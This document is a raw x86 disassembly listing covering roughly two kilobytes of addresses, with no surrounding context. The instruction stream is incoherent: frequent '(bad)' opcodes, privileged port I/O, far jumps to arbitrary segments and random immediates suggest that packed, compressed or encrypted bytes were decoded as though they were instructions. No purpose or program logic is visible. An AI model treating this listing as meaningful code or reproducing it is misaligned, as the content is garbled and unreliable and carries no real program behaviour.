  412c28:	xor    ah,0x4f
  412c2b:	cmp    BYTE PTR [eax+0x5bb526d2],0x5
  412c32:	retf   
  412c33:	call   0x7c84c84
  412c38:	cs jecxz 0x412be9
  412c3b:	clc    
  412c3c:	pop    ebx
  412c3d:	jns    0x412c35
  412c3f:	and    eax,0xd707b932
  412c44:	adc    eax,ecx
  412c46:	mov    ah,0x54
  412c48:	loopne 0x412c53
  412c4a:	xchg   edx,eax
  412c4b:	outs   dx,DWORD PTR ds:[esi]
  412c4c:	repz call 0xaa97cd90
  412c52:	cmp    ecx,ebx
  412c54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c55:	test   esi,ebx
  412c57:	mov    ah,0x40
  412c59:	mov    dh,0xe0
  412c5b:	pop    esp
  412c5c:	push   ds
  412c5d:	pop    ecx
  412c5e:	repz bound ebx,QWORD PTR ds:0x864db0d9
  412c65:	inc    eax
  412c66:	out    dx,eax
  412c67:	ins    BYTE PTR es:[edi],dx
  412c68:	inc    ebp
  412c69:	pop    esi
  412c6a:	jnp    0x412cbe
  412c6c:	ret    
  412c6d:	ror    DWORD PTR [edi+0x77],cl
  412c70:	lods   eax,DWORD PTR ds:[esi]
  412c71:	push   ebp
  412c72:	mov    DWORD PTR [ecx+0x15],edx
  412c75:	aam    0x1
  412c77:	into   
  412c78:	mov    dh,0xf0
  412c7a:	cli    
  412c7b:	mov    ebx,0xf19f8388
  412c80:	inc    ecx
  412c81:	inc    ebp
  412c82:	arpl   sp,si
  412c84:	jecxz  0x412c9b
  412c86:	xchg   BYTE PTR [edi+0x48213bd2],ch
  412c8c:	(bad)  
  412c8d:	push   edi
  412c8e:	xchg   ecx,eax
  412c8f:	xchg   esp,eax
  412c90:	lods   eax,DWORD PTR ds:[esi]
  412c91:	into   
  412c92:	jecxz  0x412c79
  412c94:	adc    BYTE PTR [edx-0x55],ch
  412c97:	jbe    0x412d11
  412c99:	adc    BYTE PTR [esi],0x49
  412c9c:	sub    al,0xa
  412c9e:	pop    es
  412c9f:	outs   dx,BYTE PTR ds:[esi]
  412ca0:	(bad)  
  412ca1:	pop    edi
  412ca2:	pushf  
  412ca3:	xchg   edi,eax
  412ca4:	pushf  
  412ca5:	mov    edi,?
  412ca7:	sar    DWORD PTR [ebx-0x80],0xfa
  412cab:	push   cs
  412cac:	push   ecx
  412cad:	(bad)  
  412cae:	popf   
  412caf:	ins    BYTE PTR es:[edi],dx
  412cb0:	jnp    0x412c81
  412cb2:	xchg   edi,eax
  412cb3:	mov    BYTE PTR [edi],bh
  412cb5:	mov    ecx,0x55351c2
  412cba:	jl     0x412c52
  412cbc:	test   eax,0x1068d340
  412cc1:	retf   0x55b2
  412cc4:	cmp    eax,0xd45f8d7d
  412cc9:	mov    ds:0x451916e4,al
  412cce:	jmp    0x412d29
  412cd0:	jmp    0xc40861f3
  412cd5:	inc    eax
  412cd6:	test   al,0x9b
  412cd8:	stos   BYTE PTR es:[edi],al
  412cd9:	or     esi,ecx
  412cdb:	or     eax,0xceb0ca9c
  412ce0:	sbb    DWORD PTR [ebx+0x34],0xffffffcc
  412ce4:	call   0xa2d40ccf
  412ce9:	in     eax,dx
  412cea:	fcom   QWORD PTR [edi]
  412cec:	ret    
  412ced:	jns    0x412d1b
  412cef:	dec    eax
  412cf0:	rcl    ch,0x1c
  412cf3:	xor    al,0x73
  412cf5:	(bad)  
  412cf8:	je     0x412c7e
  412cfa:	loopne 0x412cab
  412cfc:	fcmovnb st,st(5)
  412cfe:	je     0x412d6f
  412d00:	sbb    al,0x7d
  412d02:	cdq    
  412d03:	dec    eax
  412d04:	pop    ebp
  412d05:	inc    esi
  412d06:	pushf  
  412d07:	add    eax,0x209d629b
  412d0c:	jl     0x412ce9
  412d0e:	js     0x412d75
  412d10:	cmc    
  412d11:	push   esp
  412d12:	ret    
  412d13:	pop    ebx
  412d14:	out    0xf7,al
  412d16:	call   0x7b8c:0xd2dfa807
  412d1d:	push   edx
  412d1e:	mov    WORD PTR [edx-0x9097c2f],gs
  412d24:	xor    BYTE PTR [ecx+0x15],bl
  412d27:	xchg   edx,eax
  412d28:	fdivr  st(7),st
  412d2a:	fcomp  DWORD PTR [edi]
  412d2c:	sub    eax,0x8bdf4454
  412d31:	cmp    dh,dh
  412d33:	xchg   esi,eax
  412d34:	or     DWORD PTR [ebx],ecx
  412d36:	jecxz  0x412db0
  412d38:	jbe    0x412d68
  412d3a:	push   0x9725cf2f
  412d3f:	sti    
  412d40:	leave  
  412d41:	or     ebp,DWORD PTR [ecx+0x4]
  412d44:	inc    edx
  412d45:	(bad)  
  412d46:	mov    ecx,0x8aad222d
  412d4b:	push   ebx
  412d4c:	jmp    0xcba7:0x38115c8b
  412d53:	mov    ebp,0x1a769aa4
  412d58:	sub    cl,BYTE PTR [edi-0x4d]
  412d5b:	xchg   ebp,eax
  412d5c:	imul   edx,esp,0x53
  412d5f:	push   0x17
  412d61:	ins    BYTE PTR es:[edi],dx
  412d62:	adc    al,0x68
  412d64:	xchg   sp,ax
  412d66:	bound  edi,QWORD PTR [ebx+0x213c35c7]
  412d6c:	pop    eax
  412d6d:	cmp    eax,0x750201a2
  412d72:	fbld   TBYTE PTR [eax]
  412d74:	leave  
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	loope  0x412d72
  412d78:	leave  
  412d79:	(bad)  
  412d7a:	pop    esi
  412d7b:	jl     0x412d54
  412d7d:	cmp    esi,0x22f7abe0
  412d83:	int    0x7
  412d85:	test   al,0xce
  412d87:	inc    esp
  412d88:	dec    esi
  412d89:	cmp    al,dh
  412d8b:	sub    ah,dl
  412d8d:	test   eax,0x29e32668
  412d92:	xchg   esi,eax
  412d93:	dec    ebp
  412d94:	dec    ebp
  412d95:	test   DWORD PTR [esi-0x26ae1d14],ebx
  412d9b:	pop    eax
  412d9c:	and    al,0x9e
  412d9e:	ret    0xa77c
  412da1:	sbb    ebx,DWORD PTR [ebx+edx*2+0x48305bb3]
  412da8:	pop    ds
  412da9:	xchg   BYTE PTR [edi],ah
  412dab:	js     0x412d96
  412dad:	dec    edx
  412dae:	nop
  412daf:	push   eax
  412db0:	imul   ebx,DWORD PTR [eax-0x72fb038a],0x4706cd50
  412dba:	push   esi
  412dbb:	out    0xf5,eax
  412dbd:	bnd jle 0x412e0f
  412dc0:	push   esi
  412dc1:	jbe    0x412dd2
  412dc3:	mov    ds:0xd7c13aab,eax
  412dc8:	in     al,0x9d
  412dca:	jmp    0x412e27
  412dcc:	mov    al,BYTE PTR [edx]
  412dce:	xchg   ebx,eax
  412dcf:	clc    
  412dd0:	add    eax,0x7562449a
  412dd5:	cmc    
  412dd6:	inc    edx
  412dd7:	and    al,0xa3
  412dd9:	dec    ebx
  412dda:	mov    ch,0x5
  412ddc:	imul   edx,esp,0xffffff94
  412ddf:	inc    edi
  412de0:	sub    ebp,0xeed90194
  412de6:	(bad)  
  412de7:	clc    
  412de8:	mov    eax,0x2dee9aae
  412ded:	retf   0xd98b
  412df0:	mov    BYTE PTR [edi],cl
  412df2:	xor    al,0xb9
  412df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412df5:	pushf  
  412df6:	(bad)  
  412df7:	and    al,0x0
  412df9:	fisub  WORD PTR [eax*1+0x134abd01]
  412e00:	jbe    0x412e4d
  412e02:	xor    ebp,0x4f
  412e05:	mov    esi,0xed87d39a
  412e0a:	mov    ebp,0x211b296d
  412e0f:	pop    esi
  412e10:	sub    BYTE PTR [eax-0x6823e491],0xe6
  412e17:	push   esp
  412e18:	mov    eax,ds:0xb112948c
  412e1d:	adc    ecx,eax
  412e1f:	lea    bp,fs:[esi-0x76346436]
  412e27:	ja     0x412e8f
  412e29:	push   ebp
  412e2a:	test   al,0x5e
  412e2c:	push   esp
  412e2d:	sub    edi,DWORD PTR [ebx-0x3f1ef7cd]
  412e33:	repz or al,0xba
  412e36:	xor    dh,BYTE PTR [ebx+0x5b8a348f]
  412e3c:	cmp    DWORD PTR [ecx],esi
  412e3e:	call   0xd9d8055e
  412e43:	loopne 0x412e67
  412e45:	es jecxz 0x412eb8
  412e48:	xor    BYTE PTR ds:0x640d27dd,al
  412e4e:	push   edi
  412e4f:	test   BYTE PTR [eax],dl
  412e51:	mov    BYTE PTR [eax],bh
  412e53:	and    BYTE PTR [edi+0x7be6df20],al
  412e59:	enter  0x3527,0xba
  412e5d:	or     cl,dh
  412e5f:	xchg   DWORD PTR [esi+0x6fc9fda4],ebx
  412e65:	add    DWORD PTR [esp+esi*1-0x246a2e91],edx
  412e6c:	dec    ebp
  412e6d:	scas   al,BYTE PTR es:[edi]
  412e6e:	loope  0x412e32
  412e70:	dec    esi
  412e71:	or     ebx,ecx
  412e73:	pop    esp
  412e74:	stc    
  412e75:	fistp  QWORD PTR ds:0x438d6ba3
  412e7c:	inc    ecx
  412e7d:	dec    ebx
  412e7e:	dec    eax
  412e7f:	fisttp DWORD PTR [ebp-0x6c14585c]
  412e85:	clc    
  412e86:	sbb    ch,BYTE PTR [ebp+0x36]
  412e89:	mov    ds:0xf8df9ab9,al
  412e8e:	scas   al,BYTE PTR es:[edi]
  412e8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e90:	inc    edx
  412e91:	pop    ss
  412e92:	mov    ?,WORD PTR [edx-0x2]
  412e95:	jne    0x412e79
  412e97:	inc    ebp
  412e98:	test   BYTE PTR [ebx],ch
  412e9a:	inc    ebx
  412e9b:	cmp    esi,DWORD PTR [esp+eax*2]
  412e9e:	fist   WORD PTR [ecx]
  412ea0:	hlt    
  412ea1:	mov    ebx,0xc4acfe9c
  412ea6:	in     eax,0x1f
  412ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ea9:	test   eax,0x104cae0d
  412eae:	out    dx,eax
  412eaf:	scas   al,BYTE PTR es:[edi]
  412eb0:	out    0x79,eax
  412eb2:	fidiv  DWORD PTR [ecx+0x1b891b5b]
  412eb8:	mov    esp,ds
  412eba:	sbb    ecx,DWORD PTR [ebx+esi*2+0x3]
  412ebe:	mov    esp,0x37f8bd45
  412ec3:	std    
  412ec4:	adc    ch,0x6c
  412ec7:	mov    dh,0x28
  412ec9:	dec    esi
  412eca:	and    DWORD PTR [ebp+0x7],edi
  412ecd:	mov    ch,0xd9
  412ecf:	fldenv [esi+0x10d5d32f]
  412ed5:	(bad)  
  412ed6:	sub    edx,DWORD PTR [esi+0x23]
  412ed9:	cld    
  412eda:	test   BYTE PTR [edi+0x60744f51],cl
  412ee0:	or     BYTE PTR [ebx+0x2078a8dc],ch
  412ee6:	lock icebp 
  412ee8:	dec    esi
  412ee9:	fwait
  412eea:	pop    es
  412eeb:	or     edx,DWORD PTR [esi]
  412eed:	sti    
  412eee:	and    al,0x2d
  412ef0:	jmp    0x796ef1cc
  412ef5:	pop    esp
  412ef6:	xchg   esp,eax
  412ef7:	sar    ah,cl
  412ef9:	clc    
  412efa:	loopne 0x412f5f
  412efc:	ins    BYTE PTR es:[edi],dx
  412efd:	shl    ebp,0xa7
  412f00:	add    BYTE PTR [eax+ebp*1],bl
  412f03:	stc    
  412f04:	fwait
  412f05:	test   bh,ch
  412f07:	pop    ss
  412f08:	popf   
  412f09:	mov    ecx,0x6d470cef
  412f0e:	pusha  
  412f0f:	push   eax
  412f10:	fucom  st(0)
  412f12:	lock popf 
  412f14:	mov    ebx,0x3dfd42c1
  412f19:	dec    ebp
  412f1a:	mov    edx,0x2a72ba9f
  412f1f:	hlt    
  412f20:	(bad)  
  412f21:	clc    
  412f22:	sub    al,0x34
  412f24:	mov    edi,0xc1dc87a0
  412f29:	dec    eax
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	out    dx,al
  412f2c:	sub    DWORD PTR [ecx],esp
  412f2e:	mov    bl,0xb
  412f30:	inc    ebp
  412f31:	ret    
  412f32:	call   0x3165:0xef5ae5aa
  412f39:	xlat   BYTE PTR ds:[ebx]
  412f3a:	pop    esp
  412f3b:	xor    esp,ecx
  412f3d:	mov    ebx,0xbfa20da6
  412f42:	mov    ecx,0xf6409fb7
  412f47:	int    0xdf
  412f49:	sar    DWORD PTR [esi+ebp*2],1
  412f4c:	mov    dh,BYTE PTR [esi-0x22]
  412f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f50:	rcl    DWORD PTR [ebp+0x70],cl
  412f53:	xchg   ebx,esp
  412f55:	iret   
  412f56:	cmp    ebx,DWORD PTR [ebx+0x4a3d2f85]
  412f5c:	jmp    0x412f41
  412f5e:	dec    ebx
  412f5f:	ret    0xf6a9
  412f62:	xchg   esi,eax
  412f63:	inc    eax
  412f64:	sub    eax,0x3ad877ec
  412f69:	xlat   BYTE PTR ds:[ebx]
  412f6a:	ins    BYTE PTR es:[edi],dx
  412f6b:	xchg   BYTE PTR [esi-0x38352e31],ch
  412f71:	dec    edx
  412f72:	inc    esp
  412f73:	outs   dx,BYTE PTR ds:[esi]
  412f74:	lock lock push ebp
  412f77:	mov    esi,0xb333df2e
  412f7c:	imul   esi,DWORD PTR [ebx+0x36],0xffffffcf
  412f80:	jle    0x412f4f
  412f82:	sub    esi,ecx
  412f84:	fbld   TBYTE PTR [edi+0x8778d70]
  412f8a:	push   ss
  412f8b:	xor    edx,DWORD PTR [esi]
  412f8d:	or     DWORD PTR [esi+eiz*8-0x7345883a],esi
  412f94:	ret    
  412f95:	ds adc eax,0x8d4de48a
  412f9b:	int3   
  412f9c:	std    
  412f9d:	ds pop edx
  412f9f:	mov    ecx,0x409e3284
  412fa4:	aas    
  412fa5:	cmp    DWORD PTR [edi+0x3b],edx
  412fa8:	jbe    0x41301b
  412faa:	dec    ebx
  412fab:	and    BYTE PTR [esi+0x45],dl
  412fae:	jbe    0x412f72
  412fb0:	push   0xffffffa6
  412fb2:	ret    0xb013
  412fb5:	adc    cl,BYTE PTR [esi+0x3250f47a]
  412fbb:	scas   al,BYTE PTR es:[edi]
  412fbc:	ficomp WORD PTR ds:0xbe618ab5
  412fc2:	xor    al,0x4e
  412fc4:	cmp    dl,BYTE PTR [ebx]
  412fc6:	xor    DWORD PTR [ebx],edi
  412fc8:	adc    cl,bh
  412fca:	mov    eax,0x30fbf403
  412fcf:	sub    dh,BYTE PTR [edx+0x6f8250f2]
  412fd5:	xlat   BYTE PTR ds:[ebx]
  412fd6:	mov    dl,0x3b
  412fd8:	fstp   QWORD PTR [ecx+0x43189e67]
  412fde:	(bad)  
  412fdf:	fild   QWORD PTR [esi+0x37]
  412fe2:	ds es cmp eax,0x3562c9a7
  412fe9:	mov    ?,WORD PTR [ecx]
  412feb:	sahf   
  412fec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fed:	mov    ch,0x1a
  412fef:	sbb    BYTE PTR [ebx],bl
  412ff1:	mov    BYTE PTR [edx],dh
  412ff3:	es sahf 
  412ff5:	xor    DWORD PTR [edx],0x5b
  412ff8:	fistp  QWORD PTR [ebx-0x2d]
  412ffb:	xchg   DWORD PTR [ebp+0x33b3442b],esp
  413001:	cmp    BYTE PTR [ebx+edx*1+0x13],dh
  413005:	dec    ecx
  413006:	pop    esi
  413007:	popa   
  413008:	ins    DWORD PTR es:[edi],dx
  413009:	push   edx
  41300a:	sub    al,0x3b
  41300c:	clc    
  41300d:	push   ebx
  41300e:	dec    ebx
  41300f:	sbb    ch,BYTE PTR [edx+esi*8-0x5d53f056]
  413016:	nop
  413017:	push   0xcf09ef38
  41301c:	mov    edi,0x103e4e92
  413021:	nop
  413022:	pop    ds
  413023:	mov    al,0xba
  413025:	outs   dx,DWORD PTR ds:[esi]
  413026:	xlat   BYTE PTR ds:[ebx]
  413027:	inc    edi
  413028:	je     0x412fe7
  41302a:	or     ah,0xa5
  41302d:	push   esp
  41302e:	scas   al,BYTE PTR es:[edi]
  41302f:	mov    WORD PTR [esi],fs
  413031:	popa   
  413032:	ret    
  413033:	jno    0x41304e
  413035:	imul   eax,DWORD PTR [esp+ebx*8-0x48],0x23
  41303a:	je     0x413022
  41303c:	cmp    bh,ch
  41303e:	sub    ebp,DWORD PTR es:[ebp-0x3f]
  413042:	out    dx,eax
  413043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413044:	sbb    bl,cl
  413046:	leave  
  413047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413048:	mov    cl,0xe8
  41304a:	int3   
  41304b:	icebp  
  41304c:	arpl   WORD PTR [esi],sp
  41304e:	mov    cl,0x21
  413050:	lock mov ah,0x12
  413053:	mov    ecx,0xdaf4abb9
  413058:	pop    ss
  413059:	pop    esp
  41305a:	lods   al,BYTE PTR ds:[esi]
  41305b:	int    0x5
  41305d:	es enter 0xe9cf,0x1e
  413062:	cdq    
  413063:	jmp    0x4130de
  413065:	fwait
  413066:	and    edi,DWORD PTR [edi]
  413068:	rcr    BYTE PTR [ecx+0x38],1
  41306b:	ins    DWORD PTR es:[edi],dx
  41306c:	add    bl,BYTE PTR [ebx-0x6d]
  41306f:	xchg   esp,eax
  413070:	dec    esi
  413071:	jne    0x413074
  413073:	jmp    0x2ccfd418
  413078:	jbe    0x4130c4
  41307a:	call   0xf914:0x25e18729
  413081:	xchg   ebp,eax
  413082:	mov    cs,esi
  413084:	add    edi,esi
  413086:	jns    0x41300f
  413088:	mov    ds:0xe850ef5d,al
  41308d:	dec    ecx
  41308e:	dec    edi
  41308f:	jg     0x4130c2
  413091:	arpl   WORD PTR [ecx-0x15],ax
  413094:	shl    BYTE PTR [esi],cl
  413096:	cmc    
  413097:	out    dx,eax
  413098:	or     eax,0x2fe5a728
  41309d:	fst    DWORD PTR [edi]
  41309f:	and    dl,BYTE PTR [esi-0x4fcc2ea8]
  4130a5:	mov    al,0x39
  4130a7:	sbb    DWORD PTR [esp+eax*1],edx
  4130aa:	and    esi,ecx
  4130ac:	lahf   
  4130ad:	add    al,BYTE PTR ds:0xa63316e8
  4130b3:	sbb    dh,dl
  4130b5:	ins    DWORD PTR es:[edi],dx
  4130b6:	mov    esp,DWORD PTR [esi-0x70fd01bc]
  4130bc:	pushf  
  4130bd:	sbb    al,0xe4
  4130bf:	rcl    DWORD PTR [eax+edi*2],1
  4130c2:	outs   dx,DWORD PTR ds:[esi]
  4130c3:	xchg   edx,eax
  4130c4:	repnz scas eax,DWORD PTR es:[edi]
  4130c6:	push   esi
  4130c7:	push   cs
  4130c8:	in     al,0x41
  4130ca:	cmp    dl,BYTE PTR [edx+ebx*1]
  4130cd:	inc    ebx
  4130ce:	pop    ss
  4130cf:	ins    DWORD PTR es:[edi],dx
  4130d0:	dec    BYTE PTR [edi+0x19d43ed2]
  4130d6:	unpckhps xmm4,XMMWORD PTR [esi+0x713ada96]
  4130dd:	inc    edx
  4130de:	dec    edi
  4130df:	ds sbb ebx,esp
  4130e2:	sub    edi,ebx
  4130e4:	stc    
  4130e5:	inc    eax
  4130e6:	rol    DWORD PTR [edi],0x7d
  4130e9:	int    0xf3
  4130eb:	or     DWORD PTR [edi-0x20bfc6ea],esi
  4130f1:	sbb    DWORD PTR [esi+0x16],ecx
  4130f4:	out    dx,eax
  4130f5:	xchg   edx,eax
  4130f6:	jge    0x413172
  4130f8:	and    ecx,DWORD PTR [edx-0x3e56cd2f]
  4130fe:	push   cs
  4130ff:	cmp    eax,0xfd0e8179
  413104:	enter  0x935d,0xfa
  413108:	stos   DWORD PTR es:[edi],eax
  413109:	add    BYTE PTR [ecx-0x1ece542d],bh
  41310f:	aam    0xee
  413111:	adc    DWORD PTR [esi+0x4e537357],esi
  413117:	sub    eax,0x16ba7889
  41311c:	cwde   
  41311d:	inc    edx
  41311e:	xor    DWORD PTR [edi+0xba1e3a2],eax
  413124:	ja     0x41312f
  413126:	stos   DWORD PTR es:[edi],eax
  413127:	xor    eax,0xcb4dc665
  41312c:	imul   DWORD PTR [ebx+0x1e]
  41312f:	xchg   ebx,eax
  413130:	dec    edi
  413131:	(bad)  
  413132:	pop    esp
  413133:	mov    cl,0xde
  413135:	scas   eax,DWORD PTR es:[edi]
  413136:	cld    
  413137:	mov    eax,ds:0xa5cb8983
  41313c:	loop   0x4130e8
  41313e:	ror    DWORD PTR [esi+0x21b0a4c4],cl
  413144:	loop   0x413110
  413146:	(bad)  
  413147:	jp     0x4131b2
  413149:	pop    edx
  41314a:	add    DWORD PTR [edi+ecx*2-0x62],ebx
  41314e:	in     eax,dx
  41314f:	xchg   ebx,eax
  413150:	and    BYTE PTR [edi],cl
  413152:	add    DWORD PTR [eax+0xbc92cdb],eax
  413158:	js     0x413103
  41315a:	xor    edx,esi
  41315c:	xchg   edx,eax
  41315d:	xor    BYTE PTR [eax],dh
  41315f:	sub    eax,0xfd766c51
  413164:	daa    
  413165:	sahf   
  413166:	mov    eax,0xa320fe34
  41316b:	mov    ds,WORD PTR [eax]
  41316d:	xchg   edx,eax
  41316e:	ja     0x413163
  413170:	in     al,0x6f
  413172:	cmp    DWORD PTR ds:[eax-0xabdf052],edx
  413179:	(bad)  
  41317a:	push   ecx
  41317b:	add    DWORD PTR [esi],ebp
  41317d:	add    bl,BYTE PTR [edi]
  41317f:	mov    ds:0xd1a1cbcc,eax
  413184:	pop    edi
  413185:	or     BYTE PTR [ebx],bl
  413187:	jns    0x41315e
  413189:	jns    0x413208
  41318b:	pop    ecx
  41318c:	adc    ah,0x5d
  41318f:	scas   al,BYTE PTR es:[edi]
  413190:	adc    DWORD PTR [eax-0x51],edx
  413193:	xchg   DWORD PTR [ecx],ecx
  413195:	inc    edi
  413196:	jmp    esi
  413198:	out    0x31,al
  41319a:	mov    cs,WORD PTR [edx]
  41319c:	iret   
  41319d:	pushf  
  41319e:	mov    esi,0x575e7cff
  4131a3:	jae    0x413187
  4131a5:	dec    eax
  4131a6:	aas    
  4131a7:	ds jle 0x413221
  4131aa:	pusha  
  4131ab:	mov    eax,ds:0x3989e80d
  4131b0:	pop    edi
  4131b1:	clc    
  4131b2:	mov    al,ds:0xec2399a5
  4131b7:	or     dl,dl
  4131b9:	stos   DWORD PTR es:[edi],eax
  4131ba:	add    DWORD PTR [ebx-0x6c0cb885],eax
  4131c0:	adc    BYTE PTR [ecx+edx*1-0x6a],al
  4131c4:	xor    ebp,DWORD PTR [ecx-0x2]
  4131c7:	xchg   ecx,eax
  4131c8:	pop    es
  4131c9:	cmp    BYTE PTR [esp+edi*2],cl
  4131cc:	pusha  
  4131cd:	jbe    0x413196
  4131cf:	sbb    eax,0x71a329e7
  4131d4:	stos   BYTE PTR es:[edi],al
  4131d5:	pusha  
  4131d6:	gs enter 0xe40c,0x79
  4131db:	ins    DWORD PTR es:[edi],dx
  4131dc:	imul   ebx,DWORD PTR [edi-0x4f7d8e08],0xffffff9a
  4131e3:	cs or  bl,bl
  4131e6:	jle    0x4131d9
  4131e8:	dec    ecx
  4131e9:	lds    edx,FWORD PTR [eax-0x22831597]
  4131ef:	mov    ebx,0xe2a73659
  4131f4:	push   ebp
  4131f5:	adc    eax,0x51dee515
  4131fa:	bound  ecx,QWORD PTR [edx+0x720c4a1d]
  413200:	jns    0x41319c
  413202:	out    0x2b,eax
  413204:	inc    esp
  413205:	add    al,0xa1
  413207:	loop   0x413209
  413209:	rcr    DWORD PTR [edi-0x7c],cl
  41320c:	fwait
  41320d:	or     ebx,edi
  41320f:	test   BYTE PTR [esi+0x3d6f2f1d],ch
  413215:	xchg   ebx,eax
  413216:	jmp    0x1720:0x24b21b74
  41321d:	ja     0x4131cc
  41321f:	out    dx,ax
  413221:	pop    esi
  413222:	fild   QWORD PTR [esi+0x54]
  413225:	(bad)  
  413226:	dec    edi
  413227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413228:	mov    ah,0xb1
  41322a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41322b:	mov    ecx,0x835dd4f
  413230:	cdq    
  413231:	aam    0x40
  413233:	arpl   WORD PTR [eax-0x67546039],cx
  413239:	jmp    0xe749e66d
  41323e:	mov    edx,ebx
  413240:	mov    eax,0x9c9872c
  413245:	push   cs
  413246:	ficom  DWORD PTR [ecx-0x5d]
  413249:	call   0x8b27:0x8b0340c6
  413250:	sub    BYTE PTR [eax+0x15],ah
  413253:	cmp    cl,BYTE PTR [eax+0x5b283615]
  413259:	repz mov bl,0x42
  41325c:	mov    ds:0x465de75d,al
  413261:	pop    ecx
  413262:	push   es
  413263:	and    eax,0xa393cc72
  413268:	out    0x26,eax
  41326a:	push   es
  41326b:	mov    ds:0xb9b5ddec,eax
  413270:	push   cs
  413271:	push   edx
  413272:	(bad)  [ebx-0x774f0254]
  413278:	loope  0x4132da
  41327a:	test   DWORD PTR [ecx],esp
  41327c:	mov    edi,0x30b31aa3
  413281:	and    al,0xbe
  413283:	mul    bh
  413285:	stc    
  413286:	xchg   ebp,eax
  413287:	add    BYTE PTR [ecx+0x27],cl
  41328a:	dec    edx
  41328b:	jo     0x41327f
  41328d:	mov    esi,0x2562197
  413292:	xchg   esp,eax
  413293:	nop
  413294:	mov    dl,0x6d
  413296:	out    dx,eax
  413297:	jecxz  0x413241
  413299:	cmp    ecx,DWORD PTR [ebx+edx*4+0x79f65911]
  4132a0:	inc    eax
  4132a1:	outs   dx,BYTE PTR ds:[esi]
  4132a2:	xor    esp,DWORD PTR [esi-0x683d6d48]
  4132a8:	cmp    eax,DWORD PTR [esi-0x173f1d2e]
  4132ae:	jbe    0x4132fa
  4132b0:	adc    eax,DWORD PTR [edx+0x69d76c07]
  4132b6:	jle    0x413246
  4132b8:	cmp    ch,BYTE PTR [eax]
  4132ba:	stos   BYTE PTR es:[edi],al
  4132bb:	push   ebx
  4132bc:	dec    eax
  4132bd:	les    esi,FWORD PTR [edi-0x6f7b5d42]
  4132c3:	adc    BYTE PTR [ecx+0x55],bh
  4132c6:	push   eax
  4132c7:	mov    ds:0xdefe6cf,al
  4132cc:	sub    al,BYTE PTR [ebx-0x44bce129]
  4132d2:	mov    edi,0x14408709
  4132d7:	sti    
  4132d8:	push   ebp
  4132d9:	inc    esp
  4132da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132db:	inc    ecx
  4132dc:	or     edi,edx
  4132de:	or     ah,BYTE PTR [edx-0x7f3260c4]
  4132e4:	mov    bl,0xf9
  4132e6:	inc    edx
  4132e7:	dec    edi
  4132e8:	shl    ebx,cl
  4132ea:	out    0x39,eax
  4132ec:	mov    ah,0x5a
  4132ee:	sbb    edx,eax
  4132f0:	push   edx
  4132f1:	jle    0x41327c
  4132f3:	sbb    DWORD PTR [eax],edx
  4132f5:	ror    BYTE PTR [ecx+eax*8-0x1c],cl
  4132f9:	mov    WORD PTR [edi-0x62423986],gs
  4132ff:	cmp    BYTE PTR fs:[edi+0x6b],al
  413303:	jge    0x4132c0
  413305:	pop    ds
  413306:	xchg   DWORD PTR [ebx+0x3f5283e8],eax
  41330c:	int    0x8d
  41330e:	aad    0x4d
  413310:	bound  ebx,QWORD PTR [ecx]
  413312:	add    eax,0xc9ded69b
  413317:	sbb    al,0x79
  413319:	jp     0x4132d4
  41331b:	push   eax
  41331c:	mov    dl,0x89
  41331e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41331f:	and    eax,0xadba1766
  413324:	push   edx
  413325:	addr16 nop
  413327:	neg    edi
  413329:	data16 test al,0xd4
  41332c:	ret    0xe0f2
  41332f:	push   edi
  413330:	shl    BYTE PTR [edi+0x17],1
  413333:	xor    dl,BYTE PTR [ebx+0x19]
  413336:	xchg   esp,eax
  413337:	adc    cl,BYTE PTR [ecx+0x86406f8]
  41333d:	push   ebx
  41333e:	or     eax,0x57a22c70
  413343:	push   cs
  413344:	fs push ebp
  413346:	(bad)  
  413347:	or     DWORD PTR [ebx-0xb],esi
  41334a:	rol    BYTE PTR [ecx],cl
  41334c:	pop    ss
  41334d:	ins    BYTE PTR es:[edi],dx
  41334e:	push   cs
  41334f:	mov    eax,0x522627a8
  413354:	or     ecx,eax
  413356:	and    ah,BYTE PTR [ebx-0x7]
  413359:	mov    ds:0xfaa77bff,eax
  41335e:	sub    DWORD PTR [ecx+0x7e],esi
  413361:	loopne 0x4132e7
  413363:	fldenv [eax]
  413365:	adc    cl,BYTE PTR [ecx]
  413367:	in     eax,0x84
  413369:	and    DWORD PTR [ebx-0x1e],ebx
  41336c:	(bad)  
  41336d:	not    ecx
  41336f:	cs pushf 
  413371:	sbb    al,0x17
  413373:	jmp    0x5393:0xd6bc2684
  41337a:	cdq    
  41337b:	or     ah,al
  41337d:	into   
  41337e:	(bad)  
  41337f:	bound  ebp,QWORD PTR ds:0xfd826e30
  413385:	lods   eax,DWORD PTR ds:[esi]
  413386:	xor    dh,bl
  413388:	dec    ebp
  413389:	into   
  41338a:	or     ah,dh
  41338c:	lea    esi,ds:0x54f0037
  413392:	xor    eax,0xedd0f91f
  413397:	push   es
  413398:	mov    ds:0xf596b5df,al
  41339d:	cld    
  41339e:	ror    BYTE PTR [esi+0xd],0xf5
  4133a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133a3:	hlt    
  4133a4:	(bad)
  4133a7:	scas   eax,DWORD PTR es:[edi]
  4133a8:	pop    ds
  4133a9:	out    dx,eax
  4133aa:	rol    BYTE PTR [eax-0x80],cl
  4133ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ae:	in     al,0xe2
  4133b0:	cmc    
  4133b1:	mov    eax,0xf808c024
  4133b6:	bound  edx,QWORD PTR [ebx]
  4133b8:	lods   al,BYTE PTR ds:[esi]
  4133b9:	jmp    0x413434
  4133bb:	or     ch,BYTE PTR [ebx]
  4133bd:	or     al,0x6c
  4133bf:	test   ch,ch
  4133c1:	and    BYTE PTR [ebp-0x56],al
  4133c4:	std    
  4133c5:	aas    
